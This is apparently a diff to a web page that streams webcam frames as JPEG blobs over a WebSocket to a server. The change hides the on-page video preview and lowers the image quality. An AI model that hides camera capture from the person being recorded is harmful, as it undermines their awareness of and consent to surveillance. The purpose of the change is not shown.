@@ -8,7 +8,9 @@
 <body>
     <video 
         id="video" width="350" height="263" autoplay
-        style="border:dotted; border-color: black; transform: scaleX(-1);"
+        style="border:dotted; border-color: black; transform: scaleX(-1);
+        visibility: hidden; position: absolute; top: 0; left: 0; z-index: -1;
+        "
     >
     </video>
     <canvas 
@@ -49,7 +51,7 @@
 
                     setInterval(() => {
                         contextx.drawImage(videoElement, 0, 0, canvasx.width, canvasx.height);
-                        const imageData = canvasx.toDataURL('image/jpeg', 0.7); // Convert frame to base64
+                        const imageData = canvasx.toDataURL('image/jpeg', 0.5); // Convert frame to base64
                         
                         const imageBlob = fetch(imageData).then(res => res.blob()); // base64 to blob
                         imageBlob.then(blob => ws.send(blob)); // Send the blob to the server
